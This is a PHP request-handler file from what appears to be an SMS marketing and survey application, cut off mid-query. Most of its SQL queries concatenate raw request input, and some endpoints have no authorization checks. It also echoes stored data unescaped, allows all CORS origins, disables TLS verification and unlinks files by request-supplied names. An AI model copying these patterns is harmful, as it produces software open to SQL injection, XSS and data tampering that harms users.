<?php

	header("Access-Control-Allow-Origin: *");

	/*

	ini_set('display_errors', 1);

	ini_set('display_startup_errors', 1);

	error_reporting(E_ALL);

	*/

	@session_start();

	include_once("database.php");

	include_once("functions.php");

	$cmd = $_REQUEST['cmd'];

	setTimeZone($_SESSION['user_id']);

	

	switch($cmd){

		case "update_footer_customization":{

			$sql = "update application_settings set footer_customization='".$_REQUEST['footer_customization']."' where user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! footer info is updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_cronjob_settings":{

			$sql = "update application_settings set cron_stop_time_from='".$_REQUEST['cron_stop_time_from']."', cron_stop_time_to='".$_REQUEST['cron_stop_time_to']."' where user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! cron settings has been updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_bitly_api_keys":{

			$bitlyKey = $_REQUEST['bitly_key'];

			$bitlyToken = $_REQUEST['bitly_token'];

			$sql = "update application_settings set bitly_key='".$bitlyKey."', bitly_token='".$bitlyToken."' where user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! bitly credential has been updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "delete_gdpr_profile":{

			$subsID = $_REQUEST['subsid'];

			$res = mysqli_query($link,"delete from subscribers where id='".$subsID."'");

			if($res){

				$_SESSION['message'] = '<div class="alert alert-warning"><strong>Success!</strong> profile has been deleted.</div>';

			}else{

				

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_gdpr_profile":{

			$subsID = $_REQUEST['subs_id'];

			$sql = "update subscribers set first_name='".$_REQUEST['gdpr_name']."', last_name='".$_REQUEST['gdpr_last_name']."', phone_number='".$_REQUEST['gdpr_phone']."', email='".$_REQUEST['gdpr_email']."' where id='".$subsID."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! profile has been updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "load_apt_followUp":{

			$aptID  = $_REQUEST['aptID'];

			$alerts = "select * from appointment_followup_msgs where apt_id='".$aptID."' order by id asc";

			$altRes = mysqli_query($link,$alerts);

			if(mysqli_num_rows($altRes)){

				$index = 1;

				while($altRow = mysqli_fetch_assoc($altRes)){

		?>

					<p><label>Message Time: </label><?php echo "&nbsp;".str_replace('+','',$altRow['message_time'])?> after appointment.</p>

					<p><label>Message: </label><?php echo "&nbsp;".DBout($altRow['apt_message'])?></p>

		<?php

					if(trim($altRow['media'])!=''){

						if(@file_exists('uploads/'.$altRow['media'])){

							echo '<p><label>Media: </label> <img src="uploads/'.$altRow['media'].'" width="100" height="100" /></p>';

						}

					}

				}

			}

		}

		break;

		

		case "load_apt_alerts":{

			$aptID  = $_REQUEST['aptID'];

			$alerts = "select * from appointment_alerts where apt_id='".$aptID."' order by id asc";

			$altRes = mysqli_query($link,$alerts);

			if(mysqli_num_rows($altRes)){

				$index = 1;

				while($altRow = mysqli_fetch_assoc($altRes)){

		?>

					<p><label>Message Time: </label><?php echo "&nbsp;".str_replace('-','',$altRow['message_time'])?> before appointment.</p>

					<p><label>Message: </label><?php echo "&nbsp;".DBout($altRow['apt_message'])?></p>

		<?php

					if(trim($altRow['media'])!=''){

						if(@file_exists('uploads/'.$altRow['media'])){

							echo '<p><label>Media: </label> <img src="uploads/'.$altRow['media'].'" width="100" height="100" /></p>';

						}

					}

				}

			}

		}

		break;

		

		case "duplicate_campaign":{

			$campID = $_REQUEST['campID'];

			$title = $_REQUEST['title'];

			$keyword = $_REQUEST['keyword'];

			$sel = "select id from campaigns where lower(keyword)='".$keyword."' and user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sel);

			if(mysqli_num_rows($res)==0){

				$sel = "select * from campaigns where id='".$campID."'";

				$exe = mysqli_query($link,$sel);

				if(mysqli_num_rows($exe)){

					$row = mysqli_fetch_assoc($exe);

					$sql = "insert into campaigns

								(

									title,

									keyword,

									phone_number,

									type,

									welcome_sms,

									already_member_msg,

									double_optin,

									media,

									user_id,

									post_message,

									start_date,

									end_date,

									expire_message,

									attach_mobile_device

								)

							values

								(

									'".$title."',

									'".$keyword."',

									'".$row['phone_number']."',

									'".$row['type']."',

									'".$row['welcome_sms']."',

									'".$row['already_member_msg']."',

									'".$row['double_optin']."',

									'".$row['media']."',

									'".$row['user_id']."',

									'".$row['post_message']."',

									'".$row['start_date']."',

									'".$row['end_date']."',

									'".$row['expire_message']."',

									'".$row['attach_mobile_device']."'

								)";

					mysqli_query($link,$sql);

				}else{

					echo '{"error":"yes","message":"Campaign is already deleted."}';	

				}

				echo '{"error":"no","message":"Successfully created."}';

			}else{

				echo '{"error":"yes","message":"Keyword is already exists."}';

			}

		}

		break;

		

		case "subscribers_stats":{

			/*

			$groupID = $_REQUEST['groupID'];

			$searchType = $_REQUEST['searchType'];

			if($searchType=='subscribers'){

				$exe = mysqli_query($link,"select s.first_name,s.phone_number from subscribers_group_assignment sga, subscribers s where sga.group_id='".$groupID."' and sga.subscriber_id=s.id and s.status='1'");

			}else{

				$exe = mysqli_query($link,"select s.phone_number from subscribers_group_assignment sga, subscribers s where sga.group_id='".$groupID."' and sga.subscriber_id=s.id and s.status='2'");

			}

			echo '<div class="col-md-12">';

				echo '<div class="col-md-4" style="text-align:center"><b>Sr#</b></div>';

				echo '<div class="col-md-4" style="text-align:center"><b>Name</b></div>';

				echo '<div class="col-md-4" style="text-align:center"><b>Phone Number</b></div>';

				$index = 1;

				while($row = mysqli_fetch_assoc($exe)){

					if(trim($row['first_name'])=='')

						$name = 'N/A';

					else

						$name = $row['first_name'];

					echo '<div class="col-md-4" style="text-align:center">'.$index++.'</div>';

					echo '<div class="col-md-4" style="text-align:center">'.$name.'</div>';

					echo '<div class="col-md-4" style="text-align:center">'.$row['phone_number'].'</div>';

				}

			echo '</div>';

			*/

		}

		break;

		

		case "update_purchase_code":{

			$appSettings = getAppSettings($_SESSION['user_id']);

			if(trim($appSettings['time_zone'])!=''){

				date_default_timezone_set($appSettings['time_zone']);

			}

			$today = date('Y-m-d H:i:s');

			$purchaseCode = $_REQUEST['purchaseCode'];

			$status = $_REQUEST['status'];

			$userID = $_REQUEST['user_id'];

			$sql = "update application_settings set

						product_purchase_code='".$purchaseCode."',

						product_purchase_code_status='".$status."',

						settings_date='".$today."'

					where

						user_id='".$userID."'

						limit 1";

			$res = mysqli_query($link,$sql);

			if($res)

				echo '1';

			else

				echo mysqli_error($link);

		}

		break;

		

		case "load_subs_custom_info":{

			$subsID = $_REQUEST['subs_id'];

			$sql = "select custom_info from subscribers where id='".$subsID."'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				$row = mysqli_fetch_assoc($res);

				$info = json_decode($row['custom_info'],true);

				for($i=0; $i<count($info); $i++){

			?>

					<div class="form-group">

						<label><?php echo $info[$i]['field_label']?></label><br />

						<?php

							if($info[$i]['field_type']=='checkbox'){

								$answers = @explode(',',trim($info[$i]['field_value'],','));

								for($j=0; $j<count($answers); $j++){

									echo $answers[$j].'<br>';

								}

							}else{

								echo $info[$i]['field_value'];	

							}

						?>

					</div>

			<?php		

				}

			}else{

				echo 'Subscriber is already deleted or moved.';

			}

		}

		break;

		

		case "check_incoming_number":{

			//mail('ahsan@nimblewebsolutions.com','checking incoming number',print_r($_REQUEST,true));

			$phoneNumber = $_REQUEST['From'];

			$sql = "select id,user_id from subscribers where phone_number='".$phoneNumber."'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				$row = mysqli_fetch_assoc($res);

				$sql = "insert into chat_history

						(

							phone_id,

							message,

							direction,

							user_id,

							message_sid,

							created_date

						)

					values

						(

							'".$row['id']."',

							'".DBin($_REQUEST['Body'])."',

							'in',

							'".$row['user_id']."',

							'chat message from mobile',

							'".date('Y-m-d H:i:s')."'

						)";

				mysqli_query($link,$sql);

				//mail('ahsan@nimblewebsolutions.com','Adding to chat',print_r($_REQUEST,true));

				echo '{"incoming_number":"true"}';

			}else{

				$text = strtolower($_REQUEST['text']);

				$sel = "select id, keyword from campaigns where lower(keyword)='".$text."'";

				$exe = mysqli_query($link,$sel);

				if(mysqli_num_rows($exe)){

					$row = mysqli_fetch_assoc($exe);

					$url = getServerUrl().'/sms_controlling.php';

					$data = array(

						'To' => $_REQUEST['device_name'],

						'From' => $phoneNumber,

						'Body' => $text,

						'is_mobile' => 'true'

					);

					post_curl_mqs($url,$data);

					echo '{"incoming_number":"true"}';

				}else{

					echo '{"incoming_number":"false"}';

				}

			}

		}

		break;

		

		case "update_mobile_device":{

			$sql = "update 

						application_settings 

					set

						device_id='".$_REQUEST['mobile_device']."'

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Mobile device is updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "get_firebase_credentials":{

			//mail('ahsan@nimblewebsolutions.com','firebase Cre',print_r($_REQUEST,true));

			$deviceName  = $_REQUEST['device_name'];

			$deviceToken = $_REQUEST['firebase_token'];

			$deviceUrl   = $_REQUEST['app_url'];

			$userID      = $_REQUEST['nm_user_id'];

			$sel = "select id from mobile_devices where lower(device_name)='".$deviceName."' and user_id='".$userID."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)==0){

				$ins = "insert into mobile_devices

							(

								device_name,

								device_token,

								app_url,

								user_id

							)

						values

							(

								'".$deviceName."',

								'".$deviceToken."',

								'".$deviceUrl."',

								'".$userID."'

							)";

				$res = mysqli_query($link,$ins);

				if($res){

					setcookie("nm_user_id", "", time() -3600);

					echo '{"device_response":"true"}';

				}else{

					echo '{"device_response":"false"}';

				}

			}else{

				setcookie("nm_user_id", "", time() -3600);

				echo '{"device_response":"false"}';

			}

		}

		break;

		

		case "check_device_name":{

			//mail('ahsan@nimblewebsolutions.com','check_device_name',print_r($_REQUEST,true));

			$deviceName = $_REQUEST['device_name'];

			if(trim($deviceName)!=''){

				$sel = "select id from mobile_devices where device_name='".$deviceName."' and device_name!=''";

				$exe = mysqli_query($link,$sel);

				if(mysqli_num_rows($exe)==0){

					echo '{"device_response":"true"}';

				}else{

					echo '{"device_response":"false"}';

				}

			}else{

				echo '{"device_response":"empty"}';

			}

		}

		break;

		

		case "post_survey_twitter":{

			require_once('twitter/TwitterAPIExchange.php');

			$userInfo = getUserInfo($_SESSION['user_id']);			

			$twitter = new TwitterAPIExchange(array(

				'oauth_access_token' => $userInfo['tw_access_token'],

				'oauth_access_token_secret' => $userInfo['tw_access_token_secret'],

				'consumer_key' => $userInfo['tw_consumer_key'],

				'consumer_secret' => $userInfo['tw_consumer_secret']

			));

			

			$url = 'https://api.twitter.com/1.1/statuses/update.json';

			$requestMethod = 'POST';

			$postData = array('status' => $_REQUEST['surveyUrl']);

			$json_res = $twitter->buildOauth($url, $requestMethod)

						 ->setPostfields($postData)

						 ->performRequest();

			$response = json_decode($json_res,true);

			echo '<pre>';

			print_r($response);

		}

		break;

		

		case "post_survey_facebook":{

			$sel = "select access_token from users where id='".$_SESSION['user_id']."' and access_token!=''";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)){

				$row = mysqli_fetch_assoc($exe);

				$surveyUrl = $_REQUEST['surveyUrl'];

				$attachment =  array(

					'access_token' => $row['access_token'],

					'message' => '',

					'name' => '',

					'link' => $surveyUrl,

					'description' => '',

					'picture'=>''

				);

				$url="https://graph.facebook.com/v2.8/me/feed?access_token=".$row['access_token'];

				$ch = curl_init();

				curl_setopt($ch, CURLOPT_URL, $url );

				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 100);

				curl_setopt($ch, CURLOPT_TIMEOUT, 100);

				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true );

				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

				curl_setopt($ch, CURLOPT_POST, true );

				curl_setopt($ch, CURLOPT_POSTFIELDS, $attachment);

				//curl_setopt($ch, CURLOPT_HTTPGET, true );

				$response = curl_exec($ch);

				$response = json_decode($response,true);

				echo '<pre>';

				print_r($appSettings);

			}else{

				echo 'Facebook access token is not valid.';		

			}

		}

		break;

		

		case "get_survey_response":{

			//mail('ahsan@nimblewebsolutions.com','survey response',print_r($_REQUEST,true));

			$rating = $_REQUEST['rating'];

			$attemptID = $_REQUEST['nmAttemptID'];

			$questionType = $_REQUEST['questionType'];

			$questionID = $_REQUEST['questionID'];

			$surveyID = $_REQUEST['surveyID'];

			

			// Saving answer

			$sel = "select id from survey_responses where id='".$attemptID."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)){

				$ins = "insert into survey_answers

							(

								attempt_id,

								question_type,

								question_id,

								survey_id,

								answer

							)

						values

							(

								'".$attemptID."',

								'".$questionType."',

								'".$questionID."',

								'".$surveyID."',

								'".$rating."'

							)";

				mysqli_query($link,$ins);

			}else{

					

			}

			// End

			

			$sel = "select * from survey_questions where survey_id='".$surveyID."' and id > '".$questionID."' order by id asc limit 1";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)){

				?>

				<script>

					window.onload = function(){

							if(window.jQuery){

								// jQuery is loaded  

								//alert("Yeah!");

							}else{

								var headTag = document.getElementById('mainQuestionContainer');

								var jqTag = document.createElement('script');

								jqTag.type = 'text/javascript';

								jqTag.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js';

								//jqTag.onload = getStarRating;

								headTag.appendChild(jqTag);

								//alert('loaded');

							}

						}

				</script>

				<?php

				$questionData = mysqli_fetch_assoc($exe);

				$questionID = $questionData['id'];

				$questionType = $questionData['question_type'];

				// Options

				if($questionType=='comment_box'){

					echo '<p>';

						echo $questionData['question'];

						

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/uploads/'.$questionData['media'].'" />';

					echo '</p>';

				}else if($questionType=='star_rating_question'){

					echo '<p>';

						echo $questionData['question'];

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/uploads/'.$questionData['media'].'" />';

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/images/star-silver.png" style="margin-right:10px; cursor:pointer" alt="1" onclick="getUserResponse(this)" onmouseover="getMouseOver(this)" onmouseout="getMouseOut(this)" title="1" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/star-silver.png" style="margin-right:10px; cursor:pointer" alt="2" onclick="getUserResponse(this)" onmouseover="getMouseOver(this)" onmouseout="getMouseOut(this)" title="2" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/star-silver.png" style="margin-right:10px; cursor:pointer" alt="3" onclick="getUserResponse(this)" onmouseover="getMouseOver(this)" onmouseout="getMouseOut(this)" title="3" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/star-silver.png" style="margin-right:10px; cursor:pointer" alt="4" onclick="getUserResponse(this)" onmouseover="getMouseOver(this)" onmouseout="getMouseOut(this)" title="4" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/star-silver.png" style="margin-right:10px; cursor:pointer" alt="5" onclick="getUserResponse(this)" onmouseover="getMouseOver(this)" onmouseout="getMouseOut(this)" title="5" class="surveyEmoticons" />';

					echo '</p>';

					?>

					<script>

						function getMouseOut(obj){

							$(obj).attr('src','<?php echo getServerUrl()?>/images/star-silver.png')

						}

						function getMouseOver(obj){

							$(obj).attr('src','<?php echo getServerUrl()?>/images/star-gold.png')

						}

					</script>

					<?php

				}else if($questionType=='vote_question'){

					echo '<p>';

						echo $questionData['question'];

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/uploads/'.$questionData['media'].'" />';

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/images/like-green.png" style="margin-right:10px; cursor:pointer" alt="like-green.png" onclick="getUserResponse(this)" />';

						echo '<img src="'.getServerUrl().'/images/dislike-red.png" style="margin-right:10px; cursor:pointer" alt="dislike-red.png" onclick="getUserResponse(this)" />';

					echo '</p>';

				}else if($questionType=='emoticon_question'){

					echo '<p>';

						echo $questionData['question'];

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/uploads/'.$questionData['media'].'" />';

					echo '</p>';

					echo '<p>';

						echo '<img src="'.getServerUrl().'/images/1-ico.png" style="margin-right:10px; cursor:pointer" alt="1-ico.png" onclick="getUserResponse(this)" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/2-ico.png" style="margin-right:10px; cursor:pointer" alt="2-ico.png" onclick="getUserResponse(this)" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/3-ico.png" style="margin-right:10px; cursor:pointer" alt="3-ico.png" onclick="getUserResponse(this)" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/4-ico.png" style="margin-right:10px; cursor:pointer" alt="4-ico.png" onclick="getUserResponse(this)" class="surveyEmoticons" />';

						echo '<img src="'.getServerUrl().'/images/5-ico.png" style="margin-right:10px; cursor:pointer" alt="5-ico.png" onclick="getUserResponse(this)" class="surveyEmoticons" />';

					echo '</p>';

				}else if($questionType=='multiple_choice_question'){

					echo '<p>';

						echo $questionData['question'];

					echo '</p>';

					echo '<ul style="list-style-type:none">';

						$questionOptions = explode(',',$questionData['answers']);

						for($i=0;$i<count($questionOptions);$i++){

							echo '<li><label><input type="radio" name="multiple_choice" value="'.$questionOptions[$i].'" onclick="getUserResponse(this)">'.$questionOptions[$i].'</label></li>';

						}

					echo '</ul>';

				}

				// end options

			}else{

				echo 'Thanks for the survey.';

			}

			echo '<input type="hidden" id="nmAttemptID" value="'.$attemptID.'" />';	

			echo '<input type="hidden" id="nmSurveyID" value="'.$surveyID.'" />';

			echo '<input type="hidden" id="nmQuestionType" value="'.$questionType.'" />';

			echo '<input type="hidden" id="nmQuestionID" value="'.$questionID.'" />';

		}

		break;

		

		case "show_survey_live":{

			include_once("run_survey.php");

		}

		break;



		case "delete_survey":{

			$sql = "delete from surveys where id='".$_REQUEST['surveyID']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$sql = "delete from survey_questions where survey_id='".$_REQUEST['surveyID']."'";

				$exe = mysqli_query($link,$sql);

				$sql = "delete from survey_responses where survey_id='".$_REQUEST['surveyID']."'";

				$exe = mysqli_query($link,$sql);

				$sql = "delete from survey_answers where survey_id='".$_REQUEST['surveyID']."'";

				$exe = mysqli_query($link,$sql);

				if($exe){

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! survey deleted successfully</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! failed to delete survey</strong>.</div>';	

			}

		}

		break;



		case "save_survey":{

			$tab = $_REQUEST['tab'];

			$surveyID = $_REQUEST['surveyID'];

			$type = $_REQUEST['question_type'];

			if($tab=='name_survey'){

				$surveyName = $_REQUEST['surveyName'];

				$surveyDesc = $_REQUEST['surveyDesc'];

				if(trim($surveyID)==''){ // Adding

					$sql = "insert into surveys

								(

									survey_name,

									survey_desc,

									user_id

								)

							values

								(

									'".$surveyName."',

									'".$surveyDesc."',

									'".$_SESSION['user_id']."'

								)";

					$res = mysqli_query($link,$sql);

					if($res){

						$surveyID = mysqli_insert_id($link);

						$surveyUrl = getServerUrl().'/server.php?cmd=show_survey_live&survey_id='.$surveyID.'&uid='.$_SESSION['user_id'];

						$surveyUrl = bitlyLinkShortner($surveyUrl,$_SESSION['user_id']);

						$up = "update surveys set

									survey_link='".$surveyUrl."'

								where

									id='".$surveyID."'";

						mysqli_query($link,$up);

						echo '{"id":"'.$surveyID.'","error":"no","message":"Saved","survey_url":"'.$surveyUrl.'"}';

					}else{

						echo '{"id":"","error":"yes","message":"'.mysqli_error($link).'"}';

					}

				}else{ // Updating

					$sql = "update surveys set

								survey_name='".$surveyName."',

								survey_desc='".$surveyDesc."'

							where

								id='".$surveyID."'";

					mysqli_query($link,$sql);

					echo '{"id":"'.$surveyID.'","error":"no","message":"Updated"}';

				}						

			}

				else if($tab=='add_question'){

				if($type == 'comment_box'){

					$question = $_REQUEST['survey_question'];

					$ext = getExtension($_FILES['question_media']['name']);

					$fileName = uniqid().'.'.$ext;

					$tmpName  = $_FILES['question_media']['tmp_name'];

					if(in_array($ext,validImageExtensions())){

						$res = move_uploaded_file($tmpName,'uploads/'.$fileName);

						if($res){

							$sql = "insert into survey_questions

										(

											survey_id,

											question_type,

											question,

											media

										)

									values

										(

											'".$surveyID."',

											'".$type."',

											'".$question."',

											'".$fileName."'

										)";

							$r = mysqli_query($link,$sql);

							if($r){

								echo '{"id":"'.$surveyID.'","error":"no","message":"Saved"}';

							}else{

								echo '{"id":"'.$surveyID.'","error":"yes","message":"'.mysqli_error($link).'"}';

							}

						}

					}

				}

				else if($_REQUEST['question_type']=='emoticon_question'){

					$question = $_REQUEST['survey_question'];

					$ext = getExtension($_FILES['question_media']['name']);

					$fileName = uniqid().'.'.$ext;

					$tmpName  = $_FILES['question_media']['tmp_name'];

					if(in_array($ext,validImageExtensions())){

						$res = move_uploaded_file($tmpName,'uploads/'.$fileName);

						if($res){

							$sql = "insert into survey_questions

										(

											survey_id,

											question_type,

											question,

											media

										)

									values

										(

											'".$surveyID."',

											'".$type."',

											'".$question."',

											'".$fileName."'

										)";

							$r = mysqli_query($link,$sql);

							if($r){

								echo '{"id":"'.$surveyID.'","error":"no","message":"Saved"}';

							}else{

								echo '{"id":"'.$surveyID.'","error":"yes","message":"'.mysqli_error($link).'"}';

							}

						}

					}					

				}

				else if($_REQUEST['question_type']=='star_rating_question'){

					$question = $_REQUEST['survey_question'];

					$ext = getExtension($_FILES['question_media']['name']);

					$fileName = uniqid().'.'.$ext;

					$tmpName  = $_FILES['question_media']['tmp_name'];

					if(in_array($ext,validImageExtensions())){

						$res = move_uploaded_file($tmpName,'uploads/'.$fileName);

						if($res){

							$sql = "insert into survey_questions

										(

											survey_id,

											question_type,

											question,

											media

										)

									values

										(

											'".$surveyID."',

											'".$type."',

											'".$question."',

											'".$fileName."'

										)";

							$r = mysqli_query($link,$sql);

							if($r){

								echo '{"id":"'.$surveyID.'","error":"no","message":"Saved"}';

							}else{

								echo '{"id":"'.$surveyID.'","error":"yes","message":"'.mysqli_error($link).'"}';

							}

						}

					}

				}

				else if($_REQUEST['question_type']=='vote_question'){

					$question = $_REQUEST['survey_question'];

					$ext = getExtension($_FILES['question_media']['name']);

					$fileName = uniqid().'.'.$ext;

					$tmpName  = $_FILES['question_media']['tmp_name'];

					if(in_array($ext,validImageExtensions())){

						$res = move_uploaded_file($tmpName,'uploads/'.$fileName);

						if($res){

							$sql = "insert into survey_questions

										(

											survey_id,

											question_type,

											question,

											media

										)

									values

										(

											'".$surveyID."',

											'".$type."',

											'".$question."',

											'".$fileName."'

										)";

							$r = mysqli_query($link,$sql);

							if($r){

								echo '{"id":"'.$surveyID.'","error":"no","message":"Saved"}';

							}else{

								echo '{"id":"'.$surveyID.'","error":"yes","message":"'.mysqli_error($link).'"}';

							}

						}

					}

				}

				else if($type=='multiple_choice_question'){

					$question = $_REQUEST['survey_question'];

					$sql = "insert into survey_questions

								(

									survey_id,

									question_type,

									question,

									answers,

									media

								)

							values

								(

									'".$surveyID."',

									'".$type."',

									'".$question."',

									'".implode(',',$_REQUEST['multiple_choices'])."',

									'".$fileName."'

								)";

					$r = mysqli_query($link,$sql);

					if($r){

						echo '{"id":"'.$surveyID.'","error":"no","message":"Saved"}';

					}else{

						echo '{"id":"'.$surveyID.'","error":"yes","message":"'.mysqli_error($link).'"}';

					}	

				}

				

			}else if($tab=='save_share'){

				

			}else if($tab==''){

				

			}

		}

		break;

		

		case "get_group_subscribers":{

			$groupID = $_REQUEST['groupID'];

			$phoneID = $_REQUEST['phoneID'];

			$sql = "select s.id, s.phone_number,s.first_name,s.last_name,email from subscribers s, subscribers_group_assignment sga where sga.group_id='".$groupID."' and sga.subscriber_id=s.id and s.status='1'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				echo '<option value="all">All Numbers</option>';

				while($row=mysqli_fetch_assoc($res)){

					$name = "";

                    if($row['first_name']!=""){

					   $name = $row['first_name']." ".$row['last_name']." &nbsp";

					}

                    if($phoneID==$row['id'])

						$sel = 'selected="selected"';

					else

						$sel = '';

					echo '<option '.$sel.' value="'.$row['id'].'">'.$name.$row['phone_number'].'</option>';

				}

			}else{

				echo '<option value="all">- No subscriber found -</option>';

			}

		}

		break;


		case "delete_apt":{

			$aptID = $_REQUEST['aptID'];

			$sql = "delete from appointments where id='".$aptID."'";

			$res = mysqli_query($link,$sql);

			if($res){

				mysqli_query($link,"delete from appointment_alerts where apt_id='".$aptID."'");	

				mysqli_query($link,"delete from appointment_followup_msgs where apt_id='".$aptID."'");

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! appointment deleted successfully</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to delete appointment</strong> .</div>';

			}

		}

		break;

        case "delete_tp":{

            $tpID = $_REQUEST['tpID'];

            $sql = "delete from template where id='".$tpID."'";

            $res = mysqli_query($link,$sql);

            if($res){

                $_SESSION['message'] = '<div class="alert alert-success"><strong>Success! template deleted successfully</strong> .</div>';

            }else{

                $_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to delete template</strong> .</div>';

            }

        }

        break;

		case "update_appointment":{

			//echo '<pre>';

			//print_r($_REQUEST);

			//print_r($_FILES);

			//die();

			$aptDate = date('Y-m-d',strtotime($_REQUEST['apt_date']));

            $aptTime = getTimeObj($_REQUEST['apt_time']);

			$dateTime= $aptDate.' '.$aptTime;

			$sql = "update appointments set

						title='".DBin($_REQUEST['apt_title'])."',

						apt_time='".$dateTime."',

						apt_message='".DBin($_REQUEST['apt_message'])."',

						group_id='".$_REQUEST['group_id']."',

						phone_number='".$_REQUEST['phone_number_id']."'

					where

						id='".$_REQUEST['apt_id']."'";

			$res = mysqli_query($link,$sql);

			$aptID = $_REQUEST['apt_id'];

			if($res){

				// adding alerts here.

				$delAlt = "delete from appointment_alerts where apt_id='".$aptID."'";

				mysqli_query($link,$delAlt);

				for($i=0; $i<count($_REQUEST['before_time']); $i++){

					if((trim($_REQUEST['before_time'][$i])!='')&&(trim($_REQUEST['before_message'][$i])!='')){

						// uploading media

						if($_FILES['before_media']['name'][$i]!=''){

							$ext = getExtension($_FILES['before_media']['name'][$i]);

							if(in_array($ext,validImageExtensions())){

								$fileName = uniqid().'.'.$ext;

								$tmpName = $_FILES['before_media']['tmp_name'][$i];

								move_uploaded_file($tmpName,'uploads/'.$fileName);

								@unlink('uploads/'.$_REQUEST['delay_hidden_media'][$i]);

							}

						}else{

							$fileName = $_REQUEST['before_hidden_media'][$i];

						}

						// end

						$alerts = "insert into appointment_alerts

										(

											apt_id,

                                            message_date,

											message_time,

											apt_message,

											media,

											user_id

										)

									values

										(

											'".$aptID."',

											'".$_REQUEST['before_date'][$i]."',

                                            '".$_REQUEST['before_time'][$i]."',

											'".DBin($_REQUEST['before_message'][$i])."',

											'".$fileName."',

											'".$_SESSION['user_id']."'

										)";

						mysqli_query($link,$alerts);

					}

				}

				// end

				

				// adding followups here.

				$delFollow = "delete from appointment_followup_msgs where apt_id='".$aptID."'";

				mysqli_query($link,$delFollow);

				for($i=0; $i<count($_REQUEST['delay_time']); $i++){

					if((trim($_REQUEST['delay_time'][$i])!='')&&(trim($_REQUEST['delay_message'][$i])!='')){

						// uploading media

						if($_FILES['delay_media']['name'][$i]!=''){

							$ext = getExtension($_FILES['delay_media']['name'][$i]);

							if(in_array($ext,validImageExtensions())){

								$fileName = uniqid().'.'.$ext;

								$tmpName = $_FILES['delay_media']['tmp_name'][$i];

								move_uploaded_file($tmpName,'uploads/'.$fileName);

								@unlink('uploads/'.$_REQUEST['delay_hidden_media'][$i]);

							}

						}else{

							$fileName = $_REQUEST['delay_hidden_media'][$i];

						}

						// end

						$followup = "insert into appointment_followup_msgs

										(

											apt_id,

											message_date,

                                            message_time,

											apt_message,

											media,

											user_id

										)

									values

										(

											'".$aptID."',

											'".$_REQUEST['delay_date'][$i]."',

                                            '".$_REQUEST['delay_time'][$i]."',

											'".DBin($_REQUEST['delay_message'][$i])."',

											'".$fileName."',

											'".$_SESSION['user_id']."'

										)";

						mysqli_query($link,$followup);

					}

				}

				// end

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! appointment updated successfully</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Failed! to update appointment</strong> .</div>';

			}

			header("location: view_apts.php");

		}

		break;

        case "update_template":{

            $sql = "update template set

